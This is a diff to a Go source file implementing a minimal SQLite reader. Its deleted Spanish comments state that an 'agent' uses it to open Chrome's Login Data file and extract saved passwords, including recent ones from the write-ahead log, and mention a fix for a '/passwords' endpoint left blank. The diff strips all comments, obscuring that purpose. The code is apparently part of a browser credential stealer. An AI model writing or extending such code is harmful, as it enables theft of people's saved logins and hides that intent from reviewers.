@@ -11,33 +11,23 @@ import (
 	"unicode/utf16"
 )
 
-// Lector mínimo de SQLite en Go puro. El agente no puede permitirse CGO ni
-// arrastrar un driver completo: solo necesita abrir un Login Data de Chrome y
-// sacar las filas de una tabla. Cubre lo que ese archivo usa — b-trees de
-// tabla, páginas hoja e interior, páginas de desbordamiento y registros con
-// serial types estándar.
-
 const (
 	sqliteMagic = "SQLite format 3\x00"
 
 	pageInteriorTable = 0x05
 	pageLeafTable     = 0x0D
 
-	// Tope de profundidad del árbol y de filas: un archivo corrupto no puede
-	// colgar el proceso.
 	maxBTreedepth = 20
 )
 
-// SQLiteValue es un valor de columna ya decodificado.
 type SQLiteValue struct {
-	Kind  byte // 'n' null, 'i' entero, 'f' real, 't' texto, 'b' blob
+	Kind  byte
 	Int   int64
 	Float float64
 	Text  string
 	Blob  []byte
 }
 
-// SQLiteDB es un archivo SQLite abierto en memoria de solo lectura.
 type SQLiteDB struct {
 	data      []byte
 	pageSize  int
@@ -46,7 +36,6 @@ type SQLiteDB struct {
 	walFrames int
 }
 
-// WALFrames informa cuántos frames del write-ahead log se aplicaron.
 func (db *SQLiteDB) WALFrames() int { return db.walFrames }
 
 type sqliteTable struct {
@@ -54,7 +43,6 @@ type sqliteTable struct {
 	SQL      string
 }
 
-// OpenSQLite carga el archivo completo y valida la cabecera.
 func OpenSQLite(path string) (*SQLiteDB, error) {
 	data, err := os.ReadFile(path)
 	if err != nil {
@@ -90,18 +78,11 @@ func OpenSQLite(path string) (*SQLiteDB, error) {
 		encoding: encoding,
 	}
 
-	// Con Chrome abierto, las filas recientes viven en el -wal y no en el
-	// archivo principal. Sin este overlay la extracción se pierde justo las
-	// contraseñas apuntadas hace un rato.
 	_ = db.applyWAL(path + "-wal")
 
 	return db, nil
 }
 
-// applyWAL superpone los frames del write-ahead log sobre las páginas en
-// memoria. Formato: cabecera de 32 bytes y frames de 24 + pageSize. Los salts
-// de cada frame tienen que coincidir con los de la cabecera; el primer frame
-// que no cuadra marca el final de lo válido.
 func (db *SQLiteDB) applyWAL(walPath string) error {
 	wal, err := os.ReadFile(walPath)
 	if err != nil {
@@ -168,8 +149,6 @@ func (db *SQLiteDB) page(no uint32) ([]byte, error) {
 	return db.data[start : start+db.pageSize], nil
 }
 
-// readVarint decodifica un varint de SQLite (1 a 9 bytes, big-endian, 7 bits
-// por byte).
 func readVarint(buf []byte, offset int) (uint64, int, error) {
 	var value uint64
 	for index := 0; index < 9; index++ {
@@ -188,7 +167,6 @@ func readVarint(buf []byte, offset int) (uint64, int, error) {
 	return 0, 0, errors.New("sqlite: varint inválido")
 }
 
-// Tables devuelve el catálogo: nombre → página raíz y DDL.
 func (db *SQLiteDB) Tables() (map[string]sqliteTable, error) {
 	rows, err := db.ReadTable(1, 512)
 	if err != nil {
@@ -213,7 +191,6 @@ func (db *SQLiteDB) Tables() (map[string]sqliteTable, error) {
 	return tables, nil
 }
 
-// ReadTable recorre el b-tree de una tabla y devuelve sus filas.
 func (db *SQLiteDB) ReadTable(rootPage uint32, maxRows int) ([][]SQLiteValue, error) {
 	if maxRows <= 0 {
 		maxRows = 4096
@@ -236,7 +213,6 @@ func (db *SQLiteDB) ReadTable(rootPage uint32, maxRows int) ([][]SQLiteValue, er
 			return err
 		}
 
-		// La página 1 lleva la cabecera del archivo delante.
 		base := 0
 		if pageNo == 1 {
 			base = 100
@@ -283,7 +259,7 @@ func (db *SQLiteDB) ReadTable(rootPage uint32, maxRows int) ([][]SQLiteValue, er
 				cellOffset := int(binary.BigEndian.Uint16(buf[cellStart+index*2 : cellStart+index*2+2]))
 				payload, err := db.readLeafPayload(buf, cellOffset)
 				if err != nil {
-					continue // celda corrupta: se salta, no tumba el archivo
+					continue
 				}
 				values, err := db.decodeRecord(payload)
 				if err != nil {
@@ -304,8 +280,6 @@ func (db *SQLiteDB) ReadTable(rootPage uint32, maxRows int) ([][]SQLiteValue, er
 	return rows, nil
 }
 
-// readLeafPayload extrae el registro completo de una celda hoja, siguiendo la
-// cadena de desbordamiento si el payload no cabe en la página.
 func (db *SQLiteDB) readLeafPayload(buf []byte, cellOffset int) ([]byte, error) {
 	if cellOffset < 0 || cellOffset >= len(buf) {
 		return nil, errors.New("sqlite: celda fuera de rango")
@@ -315,7 +289,7 @@ func (db *SQLiteDB) readLeafPayload(buf []byte, cellOffset int) ([]byte, error) 
 	if err != nil {
 		return nil, err
 	}
-	_, n2, err := readVarint(buf, cellOffset+n1) // rowid
+	_, n2, err := readVarint(buf, cellOffset+n1)
 	if err != nil {
 		return nil, err
 	}
@@ -370,7 +344,6 @@ func (db *SQLiteDB) readLeafPayload(buf []byte, cellOffset int) ([]byte, error) 
 	return out, nil
 }
 
-// decodeRecord convierte el payload de un registro en columnas.
 func (db *SQLiteDB) decodeRecord(payload []byte) ([]SQLiteValue, error) {
 	headerLen, n, err := readVarint(payload, 0)
 	if err != nil {
@@ -404,11 +377,6 @@ func (db *SQLiteDB) decodeRecord(payload []byte) ([]SQLiteValue, error) {
 	return values, nil
 }
 
-// integerSizes es el tamaño real de los serial types 1..6 de SQLite. No es
-// 1..6: el 5 son 6 bytes (entero de 48 bits) y el 6 son 8 (entero de 64 bits).
-// Con el mapeo ingenuo, cualquier fila con una fecha de Chrome —que es un
-// entero de 64 bits— se desplaza dos bytes y todos los campos siguientes salen
-// cortados. Es el bug que dejaba /passwords en blanco.
 var integerSizes = [6]int{1, 2, 3, 4, 6, 8}
 
 func (db *SQLiteDB) decodeValue(serial uint64, payload []byte, offset int) (SQLiteValue, int, error) {
@@ -431,7 +399,6 @@ func (db *SQLiteDB) decodeValue(serial uint64, payload []byte, offset int) (SQLi
 		for index := 0; index < size; index++ {
 			value = (value << 8) | int64(payload[offset+index])
 		}
-		// Extensión de signo para enteros de 1 a 6 bytes.
 		shift := uint(64 - 8*size)
 		value = value << shift >> shift
 		return SQLiteValue{Kind: 'i', Int: value}, size, nil
